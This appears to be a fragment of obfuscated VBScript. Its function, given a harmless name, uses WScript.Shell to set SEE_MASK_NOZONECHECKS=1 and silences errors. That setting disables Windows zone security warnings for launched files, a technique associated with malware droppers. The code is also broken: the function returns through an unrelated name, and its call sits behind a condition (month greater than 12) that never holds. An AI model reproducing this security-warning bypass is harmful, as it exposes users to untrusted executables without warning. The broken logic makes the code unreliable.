Function DecodeManifest42()
On Error Resume Next
  Dim strBlock19,strSyncBuffer993,strBackup16
  Set strBlock19=CreateObject("WScript.Shell")
  strSyncBuffer993=strBlock19.ExpandEnvironmentStrings("%TEMP%")
  strBackup16=strBlock19.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSyncBuffer993)>0 And Len(strBackup16)>0 Then
    strBlock19.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseRegistryChunk2=1
    Exit Function
  End If
  ParseRegistryChunk2=0
End Function

If Month(Now) > 12 Then
  Call DecodeManifest42()
End If


